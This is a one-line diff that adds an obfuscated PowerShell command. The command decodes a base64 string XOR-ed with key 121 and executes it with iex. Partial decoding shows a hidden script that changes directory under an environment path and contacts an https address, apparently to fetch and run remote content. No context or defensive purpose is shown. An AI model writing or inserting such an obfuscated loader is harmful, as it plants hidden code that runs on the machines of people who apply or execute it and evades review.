@@ -1,0 +1,1 @@
+powershell -c "$e='Gh1ZXRwXD0MsKjwrKSs2PzA1PCU9Fg4XFRYYHQpCEA4LWV4RDQ0JCkNWVh8MFx8QFRwKVwEAA1YMCRUWGB1WNxI8EToaCjJPCVcbGA1eWVQWWRhXGxgNQlkKDRgLDVkYVxsYDVlULhgQDQ==';$s='';[Convert]::FromBase64String($e)|%{$s+=[char]($_ -bxor 121)};iex $s"
